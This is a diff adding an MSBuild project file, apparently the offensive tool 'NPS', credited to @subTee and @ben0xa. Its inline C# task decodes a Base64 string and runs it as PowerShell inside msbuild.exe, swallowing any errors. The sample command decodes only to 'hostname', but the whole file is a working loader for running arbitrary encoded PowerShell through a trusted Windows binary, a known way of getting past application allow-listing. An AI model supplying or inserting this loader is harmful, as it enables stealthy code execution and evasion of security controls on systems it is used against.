@@ -1,0 +1,54 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes c# code. -->
+  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe nps.xml -->
+  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
+  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
+  <!-- License: BSD 3-Clause -->
+  <Target Name="npscsharp">
+   <nps />
+  </Target>
+  <UsingTask
+    TaskName="nps"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+  <Task>
+    <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+			using System;
+			using System.Collections.ObjectModel;
+			using System.Management.Automation;
+			using System.Management.Automation.Runspaces;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;
+
+			public class nps : Task, ITask
+			{
+				public override bool Execute()
+				{
+				  string cmd = "aG9zdG5hbWU=";
+
+					PowerShell ps = PowerShell.Create();
+					ps.AddScript(Base64Decode(cmd));
+
+					Collection<PSObject> output = null;
+					try
+					{
+						output = ps.Invoke();
+						foreach (PSObject rtnItem in output)
+						{
+							Console.WriteLine(rtnItem.ToString());
+						}
+					}
+					catch(Exception e){}
+					return true;
+				}
+				public static string Base64Decode(string encodedtext) {
+				return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
+				}
+			}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
